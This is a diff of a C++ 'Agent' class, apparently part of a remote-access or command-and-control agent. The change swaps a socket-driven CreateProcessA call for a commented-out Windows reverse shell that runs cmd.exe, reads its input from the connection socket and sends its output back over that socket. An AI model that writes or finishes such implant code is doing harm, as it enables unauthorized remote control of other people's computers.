@@ -104,18 +104,58 @@ Agent::~Agent()
 
 void Agent::ShellWe()
 {
-	std::vector<char> command(512, 0);
-	unsigned long size;
-	Agent::ReadSize(this->connSocket, &size);
-	Agent::Recv(this->connSocket, static_cast<void*>(command.data()), size);
+	//HANDLE cH_read;
+	//HANDLE cH_write;
+	//DWORD bytesToRead;
+	//BOOL bSuccess = FALSE;
+	//std::vector<char> buffer(512, 0);
+	//SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+	//bSuccess = CreatePipe(&cH_read, &cH_write, &sa, 0);
+	//if (not bSuccess)
+	//{
+	//	std::cerr << "CreatePipe failed" << std::endl;
+	//}
 
-	STARTUPINFO si;
-	PROCESS_INFORMATION pi;
+	//STARTUPINFOA si;
+	//PROCESS_INFORMATION pi;
 
-	ZeroMemory(&si, sizeof(si));
-	si.cb = sizeof(si);
+	//ZeroMemory(&si, sizeof(si));
+	//si.cb = sizeof(si);
+	//si.dwFlags |= STARTF_USESTDHANDLES;
+	//si.hStdOutput = si.hStdError = cH_write;
+	//si.hStdInput = (HANDLE)this->connSocket;
 
-	ZeroMemory(&pi, sizeof(pi));
+	//ZeroMemory(&pi, sizeof(pi));
 
-	CreateProcessA(NULL, (LPSTR)"ipconfig", NULL, NULL, FALSE, 0, NULL, NULL, (LPSTARTUPINFOA) &si, &pi);
+	//CreateProcessA(NULL,
+	//	(LPSTR)"cmd.exe",
+	//	NULL,
+	//	NULL,
+	//	TRUE,
+	//	0,
+	//	NULL,
+	//	NULL,
+	//	&si,
+	//	&pi);
+
+	//CloseHandle(pi.hProcess);
+	//CloseHandle(pi.hThread);
+	//CloseHandle(cH_write);
+
+	//for (;;) {
+
+	//	bSuccess = ReadFile(cH_read,
+	//		buffer.data(),
+	//		BUF_SIZE - 1,
+	//		&bytesToRead,
+	//		NULL);
+
+	//	if (not bSuccess || bytesToRead == 0) break;
+
+	//	bSuccess = SendMsg(this->connSocket, buffer.data(), bytesToRead);
+	//	if (not bSuccess) {
+	//		// handle the error
+	//	}
+
+	//}
 }
